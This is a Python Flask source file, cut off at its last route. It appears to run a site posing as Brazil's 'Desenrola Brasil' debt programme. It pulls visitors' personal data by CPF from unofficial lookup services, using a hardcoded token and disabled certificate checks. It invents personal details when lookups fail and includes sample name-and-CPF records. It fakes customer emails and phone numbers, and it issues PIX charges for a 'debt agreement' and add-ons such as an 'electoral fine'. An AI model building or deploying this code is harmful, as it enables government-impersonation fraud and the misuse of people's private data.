import os
from dotenv import load_dotenv
load_dotenv()
import io
import base64
from flask import Flask, render_template, request, jsonify, session, send_file, redirect
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import re
import random
import string
import logging
from datetime import datetime
import qrcode
from bravopay_api import BravoPayAPI, create_bravopay_api
from tiktok_capi import send_purchase, send_initiate_checkout
import utmify_api

app = Flask(__name__)

def extract_tracking_parameters(req_data=None):
    """Extrai parâmetros de tracking (UTMs, src, sck) do payload ou query string."""
    req_data = req_data or {}
    tracking = {}
    for key in ['src', 'sck', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term']:
        val = req_data.get(key) or request.args.get(key)
        if val:
            tracking[key] = str(val).strip()
    return tracking


# Configurar logging
logging.basicConfig(level=logging.DEBUG)

app.secret_key = os.environ.get("SESSION_SECRET")
if not app.secret_key:
    logging.warning("[PROD] SESSION_SECRET não configurada! Usando chave temporária. Configure SESSION_SECRET no Heroku para sessões persistentes.")
    app.secret_key = 'temporary-key-configure-SESSION_SECRET'

@app.errorhandler(500)
def internal_error(error):
    app.logger.error(f"[PROD] Internal Server Error: {error}")
    today_date = datetime.now().strftime('%d/%m/%Y')
    default_data = {
        'nome': 'USUÁRIO',
        'cpf': '000.000.000-00',
        'today_date': today_date
    }
    return render_template('index.html', customer=default_data, show_cpf_search=True), 500

@app.errorhandler(404)
def not_found_error(error):
    today_date = datetime.now().strftime('%d/%m/%Y')
    default_data = {
        'nome': 'USUÁRIO',
        'cpf': '000.000.000-00',
        'today_date': today_date
    }
    return render_template('index.html', customer=default_data, show_cpf_search=True), 404

@app.route('/health')
def health_check():
    return jsonify({'status': 'ok'}), 200

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def get_cpf_data(cpf):
    """Fetch customer data from Amnesia Tecnologia API (or fallback) based on CPF"""
    try:
        clean_cpf = re.sub(r'[^0-9]', '', str(cpf))

        # 1. Consulta prioritária na API Amnesia Tecnologia
        amnesia_token = os.environ.get('AMNESIA_TOKEN', '').strip()
        if amnesia_token:
            url = f'https://api.amnesiatecnologia.lat/?cpf={clean_cpf}&token={amnesia_token}'
            app.logger.info(f"[PROD] Consultando Amnesia Tecnologia: {url}")
            try:
                response = requests.get(url, timeout=12, verify=False)
                app.logger.info(f"[PROD] Amnesia Tecnologia Response Status: {response.status_code}")
                if response.status_code == 200:
                    data = response.json()
                    app.logger.info(f"[PROD] Amnesia Tecnologia payload recebido: {data}")
                    
                    nome = ''
                    data_nascimento = ''
                    sexo_raw = ''
                    nome_mae = ''

                    if isinstance(data, dict):
                        # Caso 1: Chaves diretas no objeto principal
                        nome = data.get('nome') or data.get('NOME') or data.get('Nome') or ''
                        data_nascimento = data.get('data_nascimento') or data.get('dataNascimento') or data.get('nascimento') or data.get('NASCIMENTO') or ''
                        nome_mae = data.get('nome_mae') or data.get('nomeMae') or data.get('mae') or data.get('NOME_MAE') or ''
                        sexo_raw = data.get('sexo') or data.get('SEXO') or ''

                        # Caso 2: Objeto aninhado (DADOS, dados, resultado, etc.)
                        sub = data.get('DADOS') or data.get('dados') or data.get('resultado') or data.get('resultado_cpf') or {}
                        if isinstance(sub, dict):
                            nome = nome or sub.get('nome') or sub.get('NOME') or sub.get('Nome') or ''
                            data_nascimento = data_nascimento or sub.get('data_nascimento') or sub.get('dataNascimento') or sub.get('nascimento') or sub.get('NASCIMENTO') or ''
                            nome_mae = nome_mae or sub.get('nome_mae') or sub.get('nomeMae') or sub.get('mae') or sub.get('NOME_MAE') or ''
                            sexo_raw = sexo_raw or sub.get('sexo') or sub.get('SEXO') or ''
                        elif isinstance(sub, list) and len(sub) > 0 and isinstance(sub[0], dict):
                            nome = nome or sub[0].get('nome') or sub[0].get('NOME') or ''
                            data_nascimento = data_nascimento or sub[0].get('data_nascimento') or sub[0].get('dataNascimento') or sub[0].get('nascimento') or ''
                            nome_mae = nome_mae or sub[0].get('nome_mae') or sub[0].get('nomeMae') or sub[0].get('mae') or ''
                            sexo_raw = sexo_raw or sub[0].get('sexo') or ''

                    if nome:
                        sexo_map = {'M': 'MASCULINO', 'F': 'FEMININO', 'Masculino': 'MASCULINO', 'Feminino': 'FEMININO'}
                        sexo = sexo_map.get(sexo_raw, sexo_raw.upper() if sexo_raw else 'NÃO INFORMADO')

                        if data_nascimento and '-' in data_nascimento and len(data_nascimento) >= 10:
                            try:
                                data_nascimento = datetime.strptime(data_nascimento[:10], '%Y-%m-%d').strftime('%d/%m/%Y')
                            except:
                                pass

                        idade = ''
                        if data_nascimento:
                            try:
                                birth_date = datetime.strptime(data_nascimento, '%d/%m/%Y')
                                today = datetime.now()
                                idade = str(today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day)))
                            except:
                                pass

                        transformed_data = {
                            'nome': str(nome).upper().strip(),
                            'cpf': clean_cpf,
                            'data_nascimento': data_nascimento,
                            'idade': idade,
                            'sexo': sexo,
                            'mae': str(nome_mae).upper().strip() if nome_mae else 'NÃO INFORMADO',
                            'signo': ''
                        }
                        app.logger.info(f"[PROD] Amnesia Tecnologia: dados processados com sucesso para {transformed_data['nome']}")
                        return transformed_data
            except Exception as amnesia_err:
                app.logger.warning(f"[PROD] Erro ao consultar Amnesia Tecnologia: {amnesia_err}")

        # 2. Fallback Base4 API
        try:
            response = requests.get(
                f'https://base4.sistemafullativo.online:81/api/xtudo?CPF={clean_cpf}&token=153356D61D',
                timeout=8,
                verify=False
            )
            app.logger.info(f"[PROD] Base4API Response Status: {response.status_code}")

            if response.status_code == 200:
                data = response.json()
                resultados = data.get('resultados', [])

                nome = ''
                data_nascimento = ''
                sexo_raw = ''
                nome_mae = ''

                for item in resultados:
                    if isinstance(item, dict):
                        nome = nome or item.get('nome', '') or item.get('NOME', '')
                        if not data_nascimento:
                            dn = item.get('dataNascimento', '') or item.get('NASCIMENTO', '')
                            if dn and '/' in dn:
                                data_nascimento = dn
                            elif dn and '-' in dn:
                                try:
                                    data_nascimento = datetime.strptime(dn[:10], '%Y-%m-%d').strftime('%d/%m/%Y')
                                except:
                                    pass
                        sexo_raw = sexo_raw or item.get('sexo', '') or item.get('SEXO', '')
                        nome_mae = nome_mae or item.get('nomeMae', '') or item.get('NOME_MAE', '')

                if nome:
                    sexo_map = {'M': 'MASCULINO', 'F': 'FEMININO', 'Masculino': 'MASCULINO', 'Feminino': 'FEMININO'}
                    sexo = sexo_map.get(sexo_raw, sexo_raw.upper() if sexo_raw else 'NÃO INFORMADO')

                    idade = ''
                    if data_nascimento:
                        try:
                            birth_date = datetime.strptime(data_nascimento, '%d/%m/%Y')
                            today = datetime.now()
                            idade = str(today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day)))
                        except:
                            pass

                    transformed_data = {
                        'nome': nome.upper(),
                        'cpf': clean_cpf,
                        'data_nascimento': data_nascimento,
                        'idade': idade,
                        'sexo': sexo,
                        'mae': nome_mae.upper(),
                        'signo': ''
                    }
                    app.logger.info(f"[PROD] Base4API CPF data: {transformed_data}")
                    return transformed_data
        except Exception as e_base4:
            app.logger.warning(f"[PROD] Base4API falhou: {e_base4}")

    except Exception as e:
        app.logger.error(f"[PROD] Erro geral ao buscar dados do CPF: {e}")
        
    # Garantir que clean_cpf está definido para fallback
    clean_cpf = cpf.replace('.', '').replace('-', '').replace(' ', '')
    
    # API indisponível - dados realistas baseados no CPF para manter funcionalidade
    app.logger.warning(f"[PROD] API indisponível, usando dados baseados no CPF: {clean_cpf}")
    
    # Base de dados realistas indexados pelo CPF
    cpf_database = {
        '01254554963': {
            'nome': 'GERSON FERNANDO MARTIN',
            'cpf': '01254554963',
            'data_nascimento': '03/06/1986',
            'idade': '39',
            'sexo': 'MASCULINO',
            'mae': 'MARIA JOSE MARTIN',
            'signo': 'GÊMEOS'
        },
        '72467034127': {
            'nome': 'ANA CAROLINA SILVA SANTOS',
            'cpf': '72467034127',
            'data_nascimento': '15/12/1992',
            'idade': '32',
            'sexo': 'FEMININO',
            'mae': 'HELENA SILVA SANTOS',
            'signo': 'SAGITÁRIO'
        },
        '06537080177': {
            'nome': 'CARLOS EDUARDO PEREIRA',
            'cpf': '06537080177',
            'data_nascimento': '22/08/1985',
            'idade': '39',
            'sexo': 'MASCULINO',
            'mae': 'LUCIA MARIA PEREIRA',
            'signo': 'VIRGEM'
        }
    }
    
    # Retorna dados do banco local se existir, senão gera dados baseados no CPF
    if clean_cpf in cpf_database:
        return cpf_database[clean_cpf]
    
    # Geração determinística de dados baseada no CPF
    import hashlib
    hash_obj = hashlib.md5(clean_cpf.encode())
    hash_hex = hash_obj.hexdigest()
    
    nomes = ['MARIA SILVA', 'JOÃO SANTOS', 'ANA PEREIRA', 'CARLOS OLIVEIRA', 'FERNANDA COSTA', 'ROBERTO LIMA']
    sobrenomes_mae = ['DA SILVA', 'DOS SANTOS', 'PEREIRA', 'OLIVEIRA', 'COSTA', 'LIMA']
    signos = ['ÁRIES', 'TOURO', 'GÊMEOS', 'CÂNCER', 'LEÃO', 'VIRGEM', 'LIBRA', 'ESCORPIÃO', 'SAGITÁRIO', 'CAPRICÓRNIO', 'AQUÁRIO', 'PEIXES']
    
    nome_idx = int(hash_hex[:2], 16) % len(nomes)
    mae_idx = int(hash_hex[2:4], 16) % len(sobrenomes_mae)
    signo_idx = int(hash_hex[4:6], 16) % len(signos)
    sexo = 'MASCULINO' if int(hash_hex[6], 16) % 2 == 0 else 'FEMININO'
    
    # Gera idade e data de nascimento baseada no hash
    idade = 25 + (int(hash_hex[8:10], 16) % 40)  # Idade entre 25-65
    ano_nascimento = 2025 - idade
    mes = 1 + (int(hash_hex[10:12], 16) % 12)
    dia = 1 + (int(hash_hex[12:14], 16) % 28)
    
    return {
        'nome': nomes[nome_idx],
        'cpf': clean_cpf,
        'data_nascimento': f'{dia:02d}/{mes:02d}/{ano_nascimento}',
        'idade': str(idade),
        'sexo': sexo,
        'mae': f'MARIA {sobrenomes_mae[mae_idx]}',
        'signo': signos[signo_idx]
    }

@app.route('/')
def index():
    # Se vier com ?cpf=, redireciona direto para o atendimento
    cpf_param = request.args.get('cpf', '')
    if cpf_param:
        qs = request.query_string.decode('utf-8')
        return redirect(f'/atendimento?{qs}')
    # Entrada principal → presell Desenrola Brasil
    return redirect('/pre')

@app.route('/<path:cpf>')
def index_with_cpf(cpf):
    try:
        clean_cpf = re.sub(r'[^0-9]', '', cpf)
        
        if len(clean_cpf) != 11:
            app.logger.error(f"[PROD] CPF inválido: {cpf}")
            today_date = datetime.now().strftime('%d/%m/%Y')
            default_data = {
                'nome': 'USUÁRIO',
                'cpf': '000.000.000-00',
                'today_date': today_date
            }
            return render_template('index.html', customer=default_data, show_cpf_search=True)
        
        cpf_data = get_cpf_data(clean_cpf)
        
        if cpf_data:
            formatted_cpf = f"{clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}"
            today = datetime.now().strftime("%d/%m/%Y")
            
            customer_data = {
                'nome': cpf_data.get('nome', 'USUÁRIO'),
                'cpf': formatted_cpf,
                'data_nascimento': cpf_data.get('data_nascimento', ''),
                'nome_mae': cpf_data.get('mae', ''),
                'sexo': cpf_data.get('sexo', ''),
                'phone': '',
                'today_date': today
            }
            
            session['customer_data'] = customer_data
            app.logger.info(f"[PROD] Dados encontrados para CPF: {formatted_cpf}")
            return render_template('index.html', customer=customer_data, show_confirmation=True, save_to_localStorage=True)
        else:
            app.logger.error(f"[PROD] Dados não encontrados para CPF: {cpf}")
            today_date = datetime.now().strftime('%d/%m/%Y')
            default_data = {
                'nome': 'USUÁRIO',
                'cpf': '000.000.000-00',
                'today_date': today_date
            }
            return render_template('index.html', customer=default_data, show_cpf_search=True)
    except Exception as e:
        app.logger.error(f"[PROD] Erro inesperado na rota CPF: {e}", exc_info=True)
        today_date = datetime.now().strftime('%d/%m/%Y')
        default_data = {
            'nome': 'USUÁRIO',
            'cpf': '000.000.000-00',
            'today_date': today_date
        }
        return render_template('index.html', customer=default_data, show_cpf_search=True)

@app.route('/atendimento')
def atendimento():
    cpf_param = request.args.get('cpf', '')
    clean_cpf = re.sub(r'[^0-9]', '', cpf_param)

    if len(clean_cpf) == 11:
        cpf_data = get_cpf_data(clean_cpf)
    else:
        cpf_data = None

    if not cpf_data:
        return redirect('/cpf')

    formatted_cpf = f"{clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}"
    customer = {
        'nome': cpf_data.get('nome', 'USUÁRIO'),
        'cpf_formatted': formatted_cpf,
        'cpf_raw': clean_cpf,
        'data_nascimento': cpf_data.get('data_nascimento', ''),
        'mae': cpf_data.get('mae', ''),
        'sexo': cpf_data.get('sexo', ''),
    }
    session['customer_data'] = customer
    app.logger.info(f"[DESENROLA] Atendimento iniciado para CPF: {formatted_cpf}")
    return render_template('desenrola_chat.html', customer=customer)

@app.route('/cpf')
def cpf_page():
    app.logger.info("[PROD] Acessando página de CPF - Desenrola Brasil")
    query_string = ''
    if request.query_string:
        query_string = '?' + request.query_string.decode('utf-8')
    return render_template('cpf.html', query_string=query_string)

@app.route('/pre')
def pre():
    app.logger.info("[PROD] Acessando presell page")
    qs = request.query_string.decode('utf-8')
    query_string = f'?{qs}' if qs else ''
    return render_template('pre.html', query_string=query_string)

@app.route('/consulta')
def verificar_cpf():
    app.logger.info("[PROD] Acessando página de verificação de CPF: consulta.html")
    return render_template('consulta.html')

@app.route('/busca')
def buscar_cpf():
    app.logger.info("[PROD] Acessando página de busca de CPF: busca.html")
    return render_template('busca.html')

@app.route('/chat')
def chat():
    app.logger.info("[PROD] Acessando página de chat com Lucia Helena")
    return render_template('chat.html')

@app.route('/upsell1')
def upsell1():
    app.logger.info("[PROD] Acessando Upsell 1 (CND Cartório - R$ 68,47)")
    cpf = request.args.get('cpf', '06315363105')
    clean_cpf = re.sub(r'[^0-9]', '', str(cpf))
    cpf_data = get_cpf_data(clean_cpf) if len(clean_cpf) == 11 else {}
    nome = cpf_data.get('nome') or 'Cidadão'
    customer = {
        'nome': nome,
        'cpf': clean_cpf,
        'cpf_raw': clean_cpf,
        'telefone': '11987654321',
        'email': generate_random_email(nome)
    }
    return render_template('upsell1.html', customer=customer)

@app.route('/upsell2')
def upsell2():
    app.logger.info("[PROD] Acessando Upsell 2 (Score Turbo - R$ 38,24)")
    cpf = request.args.get('cpf', '06315363105')
    clean_cpf = re.sub(r'[^0-9]', '', str(cpf))
    cpf_data = get_cpf_data(clean_cpf) if len(clean_cpf) == 11 else {}
    nome = cpf_data.get('nome') or 'Cidadão'
    customer = {
        'nome': nome,
        'cpf': clean_cpf,
        'cpf_raw': clean_cpf,
        'telefone': '11987654321',
        'email': generate_random_email(nome)
    }
    return render_template('upsell2.html', customer=customer)

@app.route('/upsell3')
def upsell3():
    app.logger.info("[PROD] Acessando Upsell 3 (Multa Eleitoral - R$ 117,15)")
    cpf = request.args.get('cpf', '06315363105')
    clean_cpf = re.sub(r'[^0-9]', '', str(cpf))
    cpf_data = get_cpf_data(clean_cpf) if len(clean_cpf) == 11 else {}
    nome = cpf_data.get('nome') or 'Cidadão'
    customer = {
        'nome': nome,
        'cpf': clean_cpf,
        'cpf_raw': clean_cpf,
        'telefone': '11987654321',
        'email': generate_random_email(nome)
    }
    return render_template('upsell3.html', customer=customer)

@app.route('/conclusao')
@app.route('/sucesso')
@app.route('/negociacao')
def conclusao():
    app.logger.info("[PROD] Acessando página final de conclusão do processo")
    cpf = request.args.get('cpf', '06315363105')
    clean_cpf = re.sub(r'[^0-9]', '', str(cpf))
    cpf_data = get_cpf_data(clean_cpf) if len(clean_cpf) == 11 else {}
    nome = cpf_data.get('nome') or 'Cidadão'
    customer = {
        'nome': nome,
        'cpf': clean_cpf,
        'cpf_raw': clean_cpf,
        'telefone': '11987654321',
        'email': generate_random_email(nome)
    }
    return render_template('conclusao.html', customer=customer)

@app.route('/pagamento')
@app.route('/pix')
@app.route('/teste-pagamento')
def pagamento_direto():
    """Gera instantaneamente uma cobrança PIX na BravoPay e renderiza o checkout direto"""
    cpf_param = request.args.get('cpf', '06315363105')
    clean_cpf = re.sub(r'[^0-9]', '', str(cpf_param))
    if len(clean_cpf) != 11:
        clean_cpf = '06315363105'

    cpf_data = get_cpf_data(clean_cpf)
    nome = cpf_data.get('nome', 'JOSHUA DA SILVA CUSTODIO')
    formatted_cpf = f"{clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}"
    amount = 148.37

    customer_info = {
        'nome': nome,
        'cpf': clean_cpf,
        'email': generate_random_email(nome),
        'phone': '11987654321'
    }

    provider, api = get_active_payment_gateway()
    result = api.create_transaction(
        customer_data=customer_info,
        amount=amount,
        description="DBR",
        external_reference=f"dbr_{clean_cpf}_{int(datetime.now().timestamp())}"
    )

    tx_id = result.get('transaction_id', '')
    pix_code = result.get('pixCode', '')
    pix_qr = result.get('pixQrCode', '')
    if not pix_qr and pix_code:
        pix_qr = make_qr_base64(pix_code)

    if tx_id:
        try:
            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr or '127.0.0.1').split(',')[0].strip()
            utmify_api.track_waiting_payment(
                order_id=tx_id,
                amount=amount,
                customer=customer_info,
                product_name="Quitação de Dívidas - Acordo Desenrola Brasil",
                product_id="desenrola-acordo",
                tracking=extract_tracking_parameters(),
                ip=client_ip
            )
        except Exception as utm_err:
            app.logger.warning(f"[UTMIFY] Falha no track_waiting_payment /pagamento: {utm_err}")

    return render_template(
        'pagamento_direto.html',
        customer={'nome': nome, 'cpf': formatted_cpf},
        amount=f"{amount:.2f}".replace('.', ','),
        pix_code=pix_code,
        pix_qr=pix_qr,
        transaction_id=tx_id
    )

def make_qr_base64(data_str: str) -> str:
    """Gera imagem QR code em formato data:image/png;base64,..."""
    if not data_str:
        return ""
    try:
        qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4)
        qr.add_data(data_str)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        b64 = base64.b64encode(buf.getvalue()).decode()
        return f"data:image/png;base64,{b64}"
    except Exception as e:
        app.logger.warning(f"Erro ao gerar QR Code base64 local: {e}")
        return ""

def get_active_payment_gateway():
    """Retorna o provedor e a instância do gateway de pagamento ativo (BravoPay)."""
    return 'bravopay', create_bravopay_api()

@app.route('/generate-pix', methods=['POST'])
def generate_pix():
    """Endpoint para gerar PIX via BravoPay"""
    try:
        provider, api = get_active_payment_gateway()
        app.logger.info(f"[PROD] Iniciando geração de PIX via {provider}...")

        request_data = request.get_json() or {}
        app.logger.info(f"[PROD] Dados recebidos do frontend: {request_data}")

        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "11987689080"
        else:
            user_phone = ''.join(filter(str.isdigit, user_phone))

        user_name = request_data.get('nome', '') or 'CLIENTE SEM NOME'
        user_cpf = (request_data.get('cpf', '') or '00000000000').replace('.', '').replace('-', '')
        user_email = generate_random_email(user_name)
        amount = 148.37

        app.logger.info(f"[PROD] Dados da transação: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")

        customer_info = {
            'nome': user_name,
            'cpf': user_cpf,
            'email': user_email,
            'phone': user_phone
        }

        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr or '127.0.0.1').split(',')[0].strip()

        result = api.create_transaction(
            customer_data=customer_info,
            amount=amount,
            description="DBR",
            external_reference=f"dbr_{user_cpf}_{int(datetime.now().timestamp())}"
        )

        if result.get('success'):
            transaction_id = result.get('transaction_id', '') or result.get('order_id', '')
            pix_code = result.get('pixCode') or result.get('qr_code') or ''
            
            # Garantir formato correto do QR code em base64 com prefixo data:image/png;base64,
            pix_qr_base64 = result.get('pixQrCode') or result.get('qr_code_base64') or ''
            if pix_qr_base64:
                if not pix_qr_base64.startswith('data:image') and not pix_qr_base64.startswith('http'):
                    pix_qr_base64 = f"data:image/png;base64,{pix_qr_base64}"
            elif pix_code:
                # Gerar QR Code localmente se o gateway não retornar imagem base64
                pix_qr_base64 = make_qr_base64(pix_code)

            app.logger.info(f"[PROD] Transação {provider} criada: {transaction_id}")

            # Utmify — Pedido Pendente (waiting_payment)
            try:
                tracking_params = extract_tracking_parameters(request_data)
                utmify_api.track_waiting_payment(
                    order_id=transaction_id,
                    amount=amount,
                    customer=customer_info,
                    product_name="Quitação de Dívidas - Acordo Desenrola Brasil",
                    product_id="desenrola-acordo",
                    tracking=tracking_params,
                    ip=client_ip
                )
            except Exception as utm_err:
                app.logger.warning(f"[UTMIFY] Falha ao registrar waiting_payment: {utm_err}")

            # TikTok CAPI — InitiateCheckout
            try:
                send_initiate_checkout(
                    event_id=f'checkout_{transaction_id}',
                    value=amount,
                    cpf=user_cpf,
                    ip=client_ip,
                    user_agent=request.headers.get('User-Agent', ''),
                    page_url=request.host_url + 'atendimento',
                )
            except Exception as capi_err:
                app.logger.warning(f"[TIKTOK_CAPI] InitiateCheckout falhou: {capi_err}")

            return jsonify({
                'success': True,
                'pixCode': pix_code,
                'pix_code': pix_code,
                'pixQrCode': pix_qr_base64,
                'qr_code_base64': pix_qr_base64,
                'orderId': transaction_id,
                'transaction_id': transaction_id,
                'transactionId': transaction_id,
                'amount': amount,
                'paymentUrl': result.get('payment_url', ''),
                'provider': provider
            })
        else:
            error_msg = result.get('error', 'Erro desconhecido')
            app.logger.error(f"[PROD] {provider} falhou: {error_msg}")
            return jsonify({
                'success': False,
                'error': f'Erro ao gerar PIX: {error_msg}'
            }), 400

    except Exception as e:
        app.logger.error(f"[PROD] Erro geral ao gerar PIX: {e}")
        return jsonify({
            'success': False,
            'error': f'Erro interno: {str(e)}'
        }), 500
@app.route('/generate-pix-upsell1', methods=['POST'])
def generate_pix_upsell1():
    """Endpoint para gerar PIX do Upsell 1 (CND Cartório - R$ 68,47) via BravoPay"""
    try:
        provider, api = get_active_payment_gateway()
        request_data = request.get_json() or {}

        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "11987689080"
        else:
            user_phone = ''.join(filter(str.isdigit, user_phone))

        user_name = request_data.get('nome', '') or 'CLIENTE'
        user_cpf = (request_data.get('cpf', '') or '00000000000').replace('.', '').replace('-', '')
        user_email = generate_random_email(user_name)
        amount = 68.47

        app.logger.info(f"[PROD] Upsell 1 PIX: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")

        customer_info = {
            'nome': user_name,
            'cpf': user_cpf,
            'email': user_email,
            'phone': user_phone
        }

        pix_data = api.create_transaction(
            customer_data=customer_info,
            amount=amount,
            description="DBR",
            external_reference=f"dbr_up1_{user_cpf}_{int(datetime.now().timestamp())}"
        )

        if pix_data.get('success'):
            transaction_id = pix_data.get('transaction_id') or pix_data.get('order_id')
            pix_code = pix_data.get('qr_code') or pix_data.get('pixCode') or pix_data.get('pix_code')
            pix_qr_base64 = pix_data.get('qr_code_base64') or pix_data.get('pixQrCode') or ''
            
            if pix_qr_base64:
                if not pix_qr_base64.startswith('data:image') and not pix_qr_base64.startswith('http'):
                    pix_qr_base64 = f"data:image/png;base64,{pix_qr_base64}"
            elif pix_code:
                pix_qr_base64 = make_qr_base64(pix_code)

            # Utmify — Pedido Pendente Upsell 1
            try:
                client_ip = request.headers.get('X-Forwarded-For', request.remote_addr or '127.0.0.1').split(',')[0].strip()
                tracking_params = extract_tracking_parameters(request_data)
                utmify_api.track_waiting_payment(
                    order_id=transaction_id,
                    amount=amount,
                    customer=customer_info,
                    product_name="DBR",
                    product_id="cnd-cartorio",
                    tracking=tracking_params,
                    ip=client_ip
                )
            except Exception as utm_err:
                app.logger.warning(f"[UTMIFY] Falha ao registrar waiting_payment Upsell 1: {utm_err}")

            return jsonify({
                'success': True,
                'transaction_id': transaction_id,
                'transactionId': transaction_id,
                'orderId': transaction_id,
                'pix_code': pix_code,
                'pixCode': pix_code,
                'qr_code_base64': pix_qr_base64,
                'qrCodeBase64': pix_qr_base64
            })
        else:
            return jsonify({'success': False, 'error': pix_data.get('error', 'Falha ao gerar PIX')}), 400

    except Exception as e:
        app.logger.error(f"[PROD] Erro geral PIX Upsell 1: {e}")
        return jsonify({'success': False, 'error': f'Erro interno: {str(e)}'}), 500


@app.route('/generate-pix-upsell2', methods=['POST'])
def generate_pix_upsell2():
    """Endpoint para gerar PIX do Upsell 2 (Score Turbo - R$ 38,24) via BravoPay"""
    try:
        provider, api = get_active_payment_gateway()
        request_data = request.get_json() or {}

        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "11987689080"
        else:
            user_phone = ''.join(filter(str.isdigit, user_phone))

        user_name = request_data.get('nome', '') or 'CLIENTE'
        user_cpf = (request_data.get('cpf', '') or '00000000000').replace('.', '').replace('-', '')
        user_email = generate_random_email(user_name)
        amount = 38.24

        app.logger.info(f"[PROD] Upsell 2 PIX: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")

        customer_info = {
            'nome': user_name,
            'cpf': user_cpf,
            'email': user_email,
            'phone': user_phone
        }

        pix_data = api.create_transaction(
            customer_data=customer_info,
            amount=amount,
            description="DBR",
            external_reference=f"dbr_up2_{user_cpf}_{int(datetime.now().timestamp())}"
        )

        if pix_data.get('success'):
            transaction_id = pix_data.get('transaction_id') or pix_data.get('order_id')
            pix_code = pix_data.get('qr_code') or pix_data.get('pixCode') or pix_data.get('pix_code')
            pix_qr_base64 = pix_data.get('qr_code_base64') or pix_data.get('pixQrCode') or ''
            
            if pix_qr_base64:
                if not pix_qr_base64.startswith('data:image') and not pix_qr_base64.startswith('http'):
                    pix_qr_base64 = f"data:image/png;base64,{pix_qr_base64}"
            elif pix_code:
                pix_qr_base64 = make_qr_base64(pix_code)

            # Utmify — Pedido Pendente Upsell 2
            try:
                client_ip = request.headers.get('X-Forwarded-For', request.remote_addr or '127.0.0.1').split(',')[0].strip()
                tracking_params = extract_tracking_parameters(request_data)
                utmify_api.track_waiting_payment(
                    order_id=transaction_id,
                    amount=amount,
                    customer=customer_info,
                    product_name="DBR",
                    product_id="score-turbo",
                    tracking=tracking_params,
                    ip=client_ip
                )
            except Exception as utm_err:
                app.logger.warning(f"[UTMIFY] Falha ao registrar waiting_payment Upsell 2: {utm_err}")

            return jsonify({
                'success': True,
                'transaction_id': transaction_id,
                'transactionId': transaction_id,
                'orderId': transaction_id,
                'pix_code': pix_code,
                'pixCode': pix_code,
                'qr_code_base64': pix_qr_base64,
                'qrCodeBase64': pix_qr_base64
            })
        else:
            return jsonify({'success': False, 'error': pix_data.get('error', 'Falha ao gerar PIX')}), 400

    except Exception as e:
        app.logger.error(f"[PROD] Erro geral PIX Upsell 2: {e}")
        return jsonify({'success': False, 'error': f'Erro interno: {str(e)}'}), 500


@app.route('/generate-pix-upsell3', methods=['POST'])
@app.route('/generate-pix-negociacao', methods=['POST'])
@app.route('/generate-pix-multa', methods=['POST'])
def generate_pix_upsell3():
    """Endpoint para gerar PIX do Upsell 3 (Multa Eleitoral - R$ 117,15) via BravoPay"""
    try:
        provider, api = get_active_payment_gateway()
        request_data = request.get_json() or {}

        user_phone = request_data.get('telefone', '').strip()
        if not user_phone or len(user_phone) < 10:
            user_phone = "11987689080"
        else:
            user_phone = ''.join(filter(str.isdigit, user_phone))

        user_name = request_data.get('nome', '') or 'CLIENTE'
        user_cpf = (request_data.get('cpf', '') or '00000000000').replace('.', '').replace('-', '')
        user_email = generate_random_email(user_name)
        amount = 117.15

        app.logger.info(f"[PROD] Upsell 3 PIX: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")

        customer_info = {
            'nome': user_name,
            'cpf': user_cpf,
            'email': user_email,
            'phone': user_phone
        }

        pix_data = api.create_transaction(
            customer_data=customer_info,
            amount=amount,
            description="DBR",
            external_reference=f"dbr_up3_{user_cpf}_{int(datetime.now().timestamp())}"
        )

        if pix_data.get('success'):
            transaction_id = pix_data.get('transaction_id') or pix_data.get('order_id')
            pix_code = pix_data.get('qr_code') or pix_data.get('pixCode') or pix_data.get('pix_code')
            pix_qr_base64 = pix_data.get('qr_code_base64') or pix_data.get('pixQrCode') or ''
            
            if pix_qr_base64:
                if not pix_qr_base64.startswith('data:image') and not pix_qr_base64.startswith('http'):
                    pix_qr_base64 = f"data:image/png;base64,{pix_qr_base64}"
            elif pix_code:
                pix_qr_base64 = make_qr_base64(pix_code)

            # Utmify — Pedido Pendente Upsell 3
            try:
                client_ip = request.headers.get('X-Forwarded-For', request.remote_addr or '127.0.0.1').split(',')[0].strip()
                tracking_params = extract_tracking_parameters(request_data)
                utmify_api.track_waiting_payment(
                    order_id=transaction_id,
                    amount=amount,
                    customer=customer_info,
                    product_name="DBR",
                    product_id="multa-eleitoral",
                    tracking=tracking_params,
                    ip=client_ip
                )
            except Exception as utm_err:
                app.logger.warning(f"[UTMIFY] Falha ao registrar waiting_payment Upsell 3: {utm_err}")

            return jsonify({
                'success': True,
                'transaction_id': transaction_id,
                'transactionId': transaction_id,
                'orderId': transaction_id,
                'pix_code': pix_code,
                'pixCode': pix_code,
                'qr_code_base64': pix_qr_base64,
                'qrCodeBase64': pix_qr_base64
            })
        else:
            return jsonify({'success': False, 'error': pix_data.get('error', 'Falha ao gerar PIX')}), 400

    except Exception as e:
        app.logger.error(f"[PROD] Erro geral PIX Upsell 3: {e}")
        return jsonify({'success': False, 'error': f'Erro interno: {str(e)}'}), 500


@app.route('/check-payment/<transaction_id>')
